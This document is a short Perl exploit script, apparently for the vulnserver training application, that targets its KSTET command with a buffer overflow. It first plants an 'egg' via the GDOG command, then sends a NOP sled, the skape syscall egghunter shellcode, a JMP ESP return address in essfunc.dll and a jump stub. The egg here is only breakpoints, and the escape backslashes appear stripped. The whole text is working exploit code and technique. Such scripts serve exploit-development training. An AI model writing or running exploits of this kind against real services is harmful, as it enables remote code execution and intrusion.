#!/usr/bin/perl
use IO::Socket;

if (@ARGV < 2) { die("Usage: $0 IP_ADDRESS PORTnn"); }
$egghuntme = "GDOG "; # our variable containing the "egg" for our egghunter to find starts here
$egghuntme .= "R0cX" x 2; # two iterations of search string "R0cX"
$egghuntme .= "xCC" x 4; # four int3 breakpoints, the "egg" that will be executed 

$badheader = "KSTET ."; # sets variable $badheader to "KSTET ."
$baddata = "x90" x 20; # NOP sled
$baddata .= "x66x81xcaxffx0fx42x52x6ax02x58xcdx2ex3cx05x5ax74xefxb8x52x30x63x58x8bxfaxafx75xeaxafx75xe7xffxe7"; # skape syscall egghunter searching for R0cX
$baddata .= "x90" x (69 - length($baddata));
$baddata .= pack('V', 0x625011AF); # JMP ESP essfunc.dll
$baddata .= "x89xe0x83xe8x40xffxe0"; # mov eax, esp; sub eax, 0x40; jmp eax 

$socket = IO::Socket::INET->new( # setup TCP socket - $socket
    Proto => "tcp",
    PeerAddr => "$ARGV[0]", # command line variable 1 - IP Address
    PeerPort => "$ARGV[1]" # command line variable 2 - TCP port
) or die "Cannot connect to $ARGV[0]:$ARGV[1]";

$socket->recv($sd, 1024); # Receive 1024 bytes data from $socket, store in $sd
print "$sd"; # print $sd variable
$socket->send($egghuntme); # send "egg" data to the application
$socket->recv($sd, 1024);
$socket->send($badheader . $baddata); # send $badheader and $baddata variable via $socket